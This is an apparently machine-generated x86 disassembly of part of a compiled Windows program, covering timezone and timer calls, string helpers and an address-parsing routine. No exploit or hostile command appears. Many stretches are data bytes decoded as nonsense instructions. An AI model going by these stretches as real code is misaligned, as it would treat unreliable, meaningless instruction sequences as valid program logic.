sub eax 0x41ac0046
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
pop ds
inc ebp
dec ecx
inc esi
popad
imul ebp [ ebp + 0x64 ] 0x65526f54
je r-xdata
add al ch
cld
std
imul esi [ gs : esi + 0x65 ] 0x656d6954
pop edx
outsd
outsb
dec ecx
outsb
sub_463378
push ebp
mov ebp esp
add esp 0xffffff44
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4634c7
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xb4 ]
push eax
call GetTimeZoneInformation
sub eax 0xffffffff
je r-xdata
lea edx [ ebp - 0xb8 ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xb8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
jmp r-xdata
dec eax
je r-xdata
push 0x0
push 0x0
mov eax ebx
cdq
xor eax edx
sub eax edx
jno r-xdata
mov ebx [ ebp - 0xb4 ]
jmp r-xdata
dec eax
je r-xdata
mov ecx eax
mov eax ecx
mov edi 0x3c
cdq
idiv edi
cmp eax 0xffff
jbe r-xdata
call sub_403e34
mov ebx [ ebp - 0xb4 ]
add ebx [ ebp - 0x60 ]
jno r-xdata
dec eax
je r-xdata
push eax
mov eax ebx
cdq
xor eax edx
sub eax edx
jno r-xdata
call sub_403e2c
jmp r-xdata
call sub_403e34
mov ebx [ ebp - 0xb4 ]
add ebx [ ebp - 0xc ]
jno r-xdata
jmp r-xdata
mov eax ecx
mov ecx 0x3c
cdq
idiv ecx
cmp edx 0xffff
jbe r-xdata
call sub_403e34
jmp r-xdata
call sub_403e34
lea edx [ ebp - 0xbc ]
mov eax [ rw-data ]
call sub_406fd4
mov ecx [ ebp - 0xbc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
mov ecx edx
mov eax esi
pop edx
call sub_462750
fstp [ ebp - 0x8 ]
fwait
test ebx ebx
jle r-xdata
call sub_403e2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4634ce
lea eax [ ebp - 0xbc ]
mov edx 0x2
call sub_404e68
retn
fld [ r-xdata ]
fsub [ ebp - 0x8 ]
fstp [ ebp - 0x8 ]
fwait
sub_463544
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ esi ] 0x0
jne r-xdata
mov ebx [ ebp + 0xc ]
cmp ebx 0xffffffff
jne r-xdata
push 0x0
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4192c0
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ esi ]
call sub_406248
mov edx ebx
add edx edi
jno r-xdata
mov ebx eax
call sub_403e2c
cmp eax edx
jge r-xdata
call sub_403e34
mov eax [ esi ]
test eax eax
je r-xdata
mov eax ebx
add eax edi
jno r-xdata
call sub_403e2c
cmp edi [ eax - 0x4 ]
jb r-xdata
push eax
mov eax esi
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
call sub_403e34
lea edx [ eax + edi ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
sub_463610
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
cmp ebx 0xffffffff
jne r-xdata
mov eax ebx
cdq
push edx
push eax
mov eax esi
call sub_406248
cdq
push edx
push eax
call sub_46462c
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax esi
call sub_406248
mov ebx eax
jmp r-xdata
mov ebx eax
call sub_403e2c
test ebx ebx
jle r-xdata
xor eax eax
test esi esi
je r-xdata
call sub_403e2c
cmp eax [ esi - 0x4 ]
jb r-xdata
lea edx [ esi + eax ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_463680
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x36
inc esi
add [ eax + eax ] cl
add [ eax ] al
pop esp
dec ecx
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ecx + ebx * 4 ] ch
inc ecx
add ah dh
xchg edx eax
inc ecx
add [ eax ] bh
xchg edi eax
inc ecx
add [ edi + edx * 4 + 0x41 ] cl
add ah ch
xchg esi eax
inc ecx
add ah bh
xchg esi eax
inc ecx
add al bh
xchg ebx eax
inc ecx
add [ edi + edx * 4 ] cl
inc ecx
add [ eax ] bl
push esp
push edx
popad
inc esi
imul ebp [ ebp + 0x45 ] 0x756c6378
jae r-xdata
popad
insb
jbe r-xdata
jo r-xdata
insb
imul esp [ ecx + ecx * 2 + 0x50 ] 0x64413676
jb r-xdata
imul esp [ ebx + 0x61 ] 0x6365536c
je r-xdata
push ebx
je r-xdata
je r-xdata
imul ebp [ edi + 0x6e ] 0x53616d07
jo r-xdata
inc edi
insb
outsd
jae r-xdata
mov eax eax
aam 0x37
inc esi
add [ ecx ] dl
push es
push esp
inc edx
jns r-xdata
outsb
nop
mov ah 0x37
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc004637 ] bh
outsd
add [ eax ] al
add [ ebp + ebp + 0x46 ] ch
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add ah bl
xor [ esi ] eax
adc eax 0x49644945
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0xc004637
popad
insd
lea eax [ eax ]
dec esp
aaa
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x46 ] dl
add [ eax + eax ] bl
add [ eax ] al
add [ ecx + 0x41ac0042 ] ch
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x1fffbd57 ] dh
test eax 0xa9ec0042
inc edx
add [ edx ] dl
push esp
dec ecx
inc ebx
jb r-xdata
inc eax
add [ eax + 0xd004032 ] dl
push esp
dec ecx
inc edx
popad
jae r-xdata
inc ecx
dec eax
bound esp [ ecx + 0x6c ]
cmp al 0x38
inc esi
add [ ebx ] al
or al 0x54
dec ecx
dec ecx
imul esi [ eax + ecx + 0x49 ] 0x6f6c4764
add ah dh
xchg edx eax
inc ecx
add [ eax + 0x4b ] dh
inc esi
add [ eax - 0x6d ] bl
inc ecx
add [ ebx + ecx * 2 + 0x4c1c0046 ] al
inc esi
add [ eax + 0x7c00464c ] cl
xchg esp eax
inc ecx
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
or eax 0x42644954
inc eax
imul ebp [ edi + 0x6e ] 0x1
push eax
push esi
jb r-xdata
dec ecx
add [ ecx ] al
add [ eax ] al
add [ eax ] bh
cmp [ esi ] al
pop es
jae r-xdata
push eax
jbe r-xdata
je r-xdata
inc ebp
cld
mov edx [ r-xdata ]
call sub_405c30
xor eax eax
push ebp
push ebx
je r-xdata
add [ eax + eax ] al
pop es
dec ecx
pop edi
dec ecx
push eax
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
add [ eax ] al
push esp
adc [ eax ] al
or [ ecx + 0x64 ] cl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
lea eax [ eax ]
cld
aaa
inc esi
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] dl
add [ eax ] cl
dec ecx
inc edi
adc [ ecx + ecx * 2 + 0x64 ] dl
dec ebp
popad
js r-xdata
inc ecx
jb r-xdata
inc ecx
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
arpl [ ecx + 0x6c ] sp
or esi 0xffffffff
inc ebx
xor esi esi
push sub_4639e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
test ebx ebx
jl r-xdata
popad
insd
mov eax eax
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
add [ eax ] al
or [ ecx + 0x64 ] cl
inc edi
insb
outsd
bound esp [ ecx + 0x6c ]
mov esp 0x4638
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
cmp [ esi ] al
add al 0x0
dec ecx
pop edi
dec ecx
push eax
jbe r-xdata
add [ eax ] al
cmp [ eax ] bh
inc esi
add [ edi ] al
imul ebp [ esi + 0x65 ] 0x69746341
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bh
aaa
inc esi
add [ ebx ] cl
insd
popad
inc ebp
js r-xdata
test esi esi
jl r-xdata
mov eax edi
test esi esi
jl r-xdata
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
call 0x4467ecd
add [ eax ] al
add [ eax + ecx * 2 + 0x41 ] dh
call sub_403e2c
cmp esi [ ebp - 0x8 ]
jle r-xdata
call sub_403e2c
cmp esi [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax edi
call sub_464d00
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + esi * 4 ]
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4639ec
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ r-xdata ]
call sub_405af0
retn
inc esi
dec ebx
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_4638f8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push 0x20
xor edx edx
mov eax esi
call sub_419774
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_463930
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
test ebx ebx
js r-xdata
mov edx esp
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov ecx [ ebp - 0x8 ]
inc ecx
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_405c30
xor eax eax
push ebp
push sub_4639e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
test ebx ebx
jl r-xdata
mov esi [ edx + ebx * 4 ]
dec ebx
push esi
jns r-xdata
or esi 0xffffffff
inc ebx
xor esi esi
test esi esi
jl r-xdata
mov eax edi
test esi esi
jl r-xdata
call sub_403e2c
cmp esi [ ebp - 0x8 ]
jle r-xdata
call sub_403e2c
cmp esi [ ebp - 0x8 ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + esi * 4 ]
mov eax edi
call sub_464d00
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + esi * 4 ]
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4639ec
mov eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
inc ecx
mov edx [ r-xdata ]
call sub_405af0
retn
inc esi
dec ebx
jne r-xdata
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
sub_463a00
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
mov ecx [ ecx ]
test ecx ecx
je r-xdata
call sub_403e2c
cmp ebx [ ecx - 0x4 ]
jb r-xdata
add ecx ebx
test eax eax
je r-xdata
call sub_403e2c
cmp edx [ eax - 0x4 ]
jb r-xdata
add eax edx
mov edx [ ebp + 0x8 ]
xchg edx ecx
call sub_402f9c
pop ebx
pop ebp
retn 0x8
sub_463a38
push ecx
mov [ esp ] ax
mov eax [ edx ]
test eax eax
je r-xdata
call sub_403e2c
cmp ecx [ eax - 0x4 ]
jb r-xdata
add eax ecx
mov edx eax
mov eax esp
mov ecx 0x2
call sub_402f9c
pop edx
retn
sub_463a60
push ecx
mov [ esp ] eax
mov eax [ edx ]
test eax eax
je r-xdata
call sub_403e2c
cmp ecx [ eax - 0x4 ]
jb r-xdata
add eax ecx
mov edx eax
mov eax esp
mov ecx 0x4
call sub_402f9c
pop edx
retn
sub_463a88
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
test eax eax
jge r-xdata
mov edx [ esi ]
test edx edx
je r-xdata
mov eax ebx
call sub_405120
call sub_403e2c
cmp edi [ edx - 0x4 ]
jb r-xdata
add edx edi
mov ecx 0x1
dec ecx
test ebx ebx
je r-xdata
call sub_403e2c
cmp ecx [ ebx - 0x4 ]
jb r-xdata
inc ecx
lea ecx [ ebx + ecx - 0x1 ]
xchg ecx eax
call sub_402f9c
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_463adc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
movzx ecx [ ebp - 0x1 ]
mov edx esi
call sub_463ba0
mov eax esi
mov edx r-xdata
call sub_405270
jne r-xdata
mov edx [ ebx ]
mov eax esi
call [ rw-data ]
mov edi eax
mov edx [ ebx ]
mov eax esi
call sub_405468
mov edi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
sub ecx 0x1
jno r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_404e98
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov eax [ ebx ]
mov edx 0x1
call sub_405384
cmp [ ebp - 0x1 ] 0x0
je r-xdata
call sub_403e34
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_404e44
jmp r-xdata
push ebx
mov eax esi
call sub_405120
mov edx eax
add edx edi
jno r-xdata
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_405384
jmp r-xdata
call sub_403e34
sub_463ba0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_463c83
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx r-xdata
call sub_405270
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx [ ebx ]
mov eax [ r-xdata ]
call sub_4626d8
mov eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov edx edi
mov eax [ r-xdata ]
call sub_4626d8
mov eax [ ebp - 0xc ]
pop edx
call [ rw-data ]
mov esi eax
mov edx [ ebx ]
mov eax edi
call sub_405468
mov esi eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov ecx esi
sub ecx 0x1
jno r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
call sub_404e98
cmp [ ebp - 0x1 ] 0x0
je r-xdata
test esi esi
jne r-xdata
mov eax [ ebx ]
mov edx 0x1
call sub_405384
cmp [ ebp - 0x1 ] 0x0
je r-xdata
call sub_403e34
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463c8a
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_404e68
retn
mov eax ebx
call sub_404e44
jmp r-xdata
push ebx
mov eax edi
call sub_405120
mov edx eax
add edx esi
jno r-xdata
mov eax [ ebx ]
mov ecx 0x7fffffff
call sub_405384
call sub_403e34
sub_463ca0
add esp 0xfffffff0
lea eax [ esp + 0x8 ]
push eax
call QueryPerformanceFrequency
test eax eax
je r-xdata
call GetTickCount
push esp
call QueryPerformanceCounter
test eax eax
je r-xdata
call GetTickCount
jmp r-xdata
fild [ esp ]
fild [ esp + 0x8 ]
fdivp st1
fmul [ r-xdata ]
call sub_40326c
xor edx edx
test edx edx
je r-xdata
add esp 0x10
retn
call sub_403e2c
sub_463cf0
cmp eax edx
ja r-xdata
or ecx 0xffffffff
sub ecx eax
jae r-xdata
sub edx eax
jae r-xdata
add edx ecx
jae r-xdata
call sub_403e34
mov eax edx
retn
call sub_403e34
mov eax edx
retn
call sub_403e34
sub_463d18
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
test al al
je r-xdata
mov eax ebx
mov edx edi
call sub_404e98
mov eax ebx
mov edx esi
call sub_404e98
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_463d54
push ebx
push esi
push edi
push ebp
mov edi eax
mov bl 0x1
mov eax edi
call sub_405120
mov ebp eax
test ebp ebp
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
call sub_403e2c
cmp esi [ edi - 0x4 ]
jb r-xdata
inc esi
movzx eax [ edi + esi - 0x1 ]
call sub_463d44
test al al
jne r-xdata
inc esi
dec ebp
jne r-xdata
xor ebx ebx
dec esi
test edi edi
je r-xdata
sub_463d9c
cmp al 0x30
jb r-xdata
cmp al 0x41
jb r-xdata
cmp al 0x39
jbe r-xdata
cmp al 0x61
jb r-xdata
cmp al 0x46
jbe r-xdata
mov al 0x1
retn
xor eax eax
retn
cmp al 0x66
jbe r-xdata
sub_463dbc
push ebx
push esi
push edi
push ebp
mov edi eax
mov bl 0x1
mov eax edi
call sub_405120
mov ebp eax
test ebp ebp
jle r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi 0x1
call sub_403e2c
cmp esi [ edi - 0x4 ]
jb r-xdata
inc esi
movzx eax [ edi + esi - 0x1 ]
call sub_463d9c
test al al
jne r-xdata
inc esi
dec ebp
jne r-xdata
xor ebx ebx
dec esi
test edi edi
je r-xdata
sub_463e20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_463e98
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
call sub_404e44
mov esi 0x8
mov ebx [ ebp - 0x4 ]
push [ edi ]
push r-xdata
lea eax [ ebp - 0x8 ]
push eax
movzx edx [ ebx ]
mov ecx 0x4
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x8 ]
mov eax edi
mov edx 0x3
call sub_4051e4
add ebx 0x2
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463e9f
lea eax [ ebp - 0x8 ]
call sub_404e44
retn
sub_463eb4
push ebp
mov ebp esp
mov ecx 0x10
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46449e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_404e44
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404edc
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4644a5
lea eax [ ebp - 0x84 ]
mov edx 0x11
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x3a
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_405120
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
lea eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx r-xdata
call sub_405170
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x3a
jne r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov [ ebp - 0x14 ] eax
mov esi 0x1
cmp [ ebp - 0x8 ] 0x3
jne r-xdata
sub eax 0x3
jne r-xdata
call sub_403e2c
cmp esi [ eax - 0x4 ]
jb r-xdata
mov eax [ ebp - 0xc ]
add eax 0xfffffffe
sub eax 0x6
jae r-xdata
mov eax [ ebp - 0xc ]
add eax 0xfffffffe
sub eax 0x5
jae r-xdata
inc esi
movzx eax [ eax + esi - 0x1 ]
cmp eax 0x3a
jg r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp - 0x34 ]
dec ecx
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x48 ]
lea eax [ ebp - 0x44 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x44 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
add eax 0xffffffbf
sub eax 0x6
jb r-xdata
je r-xdata
cmp edi 0xffff
jg r-xdata
inc eax
mov eax [ ebp + eax * 4 - 0x38 ]
cmp eax [ ebp - 0x40 ]
jg r-xdata
call sub_403e2c
cmp [ ebp - 0x8 ] 0x0
jg r-xdata
add eax 0xffffffe6
sub eax 0x6
jb r-xdata
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x8
jge r-xdata
sub eax 0x2e
je r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x4c ]
mov eax ebx
mov ecx r-xdata
call sub_405170
mov [ ebp - 0xd ] 0x0
mov eax [ ebp - 0xc ]
sub eax 0x2
jl r-xdata
jmp r-xdata
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x4
jge r-xdata
add eax 0xfffffffe
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
inc eax
mov [ ebp - 0x14 ] eax
mov esi 0x2
mov eax [ ebp - 0x4 ]
dec esi
test eax eax
je r-xdata
inc eax
mov [ ebp + eax * 4 - 0x38 ] esi
jmp r-xdata
call sub_403e2c
mov eax [ ebp - 0x8 ]
dec eax
cmp eax 0x2
jbe r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
inc eax
mov edi [ ebp + eax * 4 - 0x38 ]
dec esi
cmp esi 0x7
jbe r-xdata
call sub_403e2c
inc eax
mov [ ebp + eax * 4 - 0x44 ] esi
jmp r-xdata
call sub_403e2c
mov eax [ ebx ]
call sub_405120
mov edx eax
dec edx
mov eax ebx
call sub_4055ac
lea eax [ ebp - 0x68 ]
push eax
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
inc eax
mov edx [ ebp + eax * 4 - 0x38 ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x60 ]
lea eax [ ebp - 0x5c ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x5c ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e2c
inc esi
mov eax [ ebp + esi * 4 - 0x38 ]
dec eax
cmp edi eax
jne r-xdata
call sub_403e2c
inc eax
mov esi [ ebp + eax * 4 - 0x38 ]
mov ecx [ ebp - 0x40 ]
sub ecx esi
dec ecx
mov eax [ ebp - 0xc ]
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e2c
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xffff
jle r-xdata
lea eax [ ebp - 0x54 ]
push eax
dec esi
cmp esi 0x7
jbe r-xdata
cmp [ ebp - 0xd ] 0x0
je r-xdata
inc eax
mov edx esi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x68 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e2c
push [ ebx ]
lea eax [ ebp - 0x64 ]
push eax
mov ecx 0x1
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x64 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
inc esi
mov ecx [ ebp + esi * 4 - 0x38 ]
mov eax esi
dec eax
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e2c
mov [ ebp - 0xd ] 0x1
mov eax 0x8
sub eax [ ebp - 0xc ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
inc eax
sub ecx edi
dec ecx
mov eax esi
dec eax
dec eax
cmp eax 0x7
jbe r-xdata
call sub_403e2c
mov edi eax
test edi edi
jle r-xdata
sub eax 0x2
lea eax [ ebp - 0x6c ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
mov edx [ ebp - 0x6c ]
mov eax ebx
call sub_40512c
lea eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x40 ]
sub ecx esi
dec ecx
mov edx esi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x70 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
inc eax
mov edx edi
inc edx
mov eax [ ebp - 0x4 ]
call sub_405384
mov ecx [ ebp - 0x54 ]
lea eax [ ebp - 0x50 ]
mov edx r-xdata
call sub_405170
mov edx [ ebp - 0x50 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
mov edi eax
test edi edi
jl r-xdata
call sub_403e2c
inc esi
dec [ ebp - 0x14 ]
jne r-xdata
mov eax ebx
mov edx r-xdata
call sub_40512c
dec edi
jne r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xff
jle r-xdata
mov eax ebx
call sub_404e44
jmp r-xdata
cmp edi 0xffff
jle r-xdata
mov eax esi
dec eax
dec eax
cmp eax 0x7
jbe r-xdata
jmp r-xdata
push [ ebx ]
lea eax [ ebp - 0x74 ]
push eax
mov ecx 0x2
mov edx edi
mov eax [ r-xdata ]
call sub_46257c
push [ ebp - 0x74 ]
push r-xdata
mov eax ebx
mov edx 0x3
call sub_4051e4
lea eax [ ebp - 0x78 ]
push eax
mov ecx [ ebp - 0x38 ]
